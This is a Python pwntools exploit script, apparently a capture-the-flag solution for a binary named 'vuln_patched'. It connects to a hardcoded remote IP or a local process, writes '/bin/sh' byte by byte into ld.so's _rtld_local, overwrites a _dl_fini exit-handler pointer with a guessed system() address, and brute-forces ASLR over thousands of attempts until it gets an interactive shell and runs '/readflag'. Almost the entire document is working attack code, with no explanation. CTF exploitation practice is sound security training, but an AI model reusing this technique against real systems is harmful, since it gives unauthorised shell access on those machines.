#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./vuln_patched
import random
from pwn import *

HOST, PORT = "65.108.176.61 55557".split()
HOST, PORT = "localhost 55557".split()
# HOST, PORT = "192.168.152.132 55557".split()
# Set up pwntools for the correct architecture
exe = context.binary = ELF('./vuln_patched')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b *_dl_fini+325
# b *__run_exit_handlers
continue
'''.format(**locals())

trials = -1

while True:
    trials += 1
    log.info(f"trial: {trials}")
    if trials > 5000:
        log.warning("Probably failed :(")
        break
    try:
        io = start()
    except:
        log.warning("Connection failed, sleeping before another trial...")
        sleep(20)
        continue
    if args.REMOTE:
        io.recvline()

    if args.GDB:
        pause()

    io.sendline(b"100000")
    # write system here
    dl_fini_offset = 0x301f88
    # write /bin/sh there
    rtld_local = 0x307978
    cleanup = 0x2c5458
    dl_fini_offset = 0x307f88
    one_gadget = 0xcc566

    size2 = 10
    io.sendline(hex(size2).replace("0x", "").encode())

    # /bin/sh
    io.sendline(b"30797e 68")
    io.sendline(b"30797d 73")
    io.sendline(b"30797c 2e")
    io.sendline(b"30797b 6e")
    io.sendline(b"30797a 69")
    io.sendline(b"307979 62")
    io.sendline(b"307978 2f")

    # system offset + ASLR guess
    io.sendline(b"307f8a 16")
    io.sendline(b"307f89 9d")
    io.sendline(b"307f88 e0")

    if args.GDB:
        pause()
    try:
        res = io.recvline(timeout=1)
        io.sendline(b"/readflag")
    except EOFError:
        io.close()
        continue

    res = io.recvall(timeout=5)
    if res:
        log.success(f"Got response: {res}")
        log.info(f"trials: {trials}")
        io.interactive()
        break

    if args.GDB:
        break
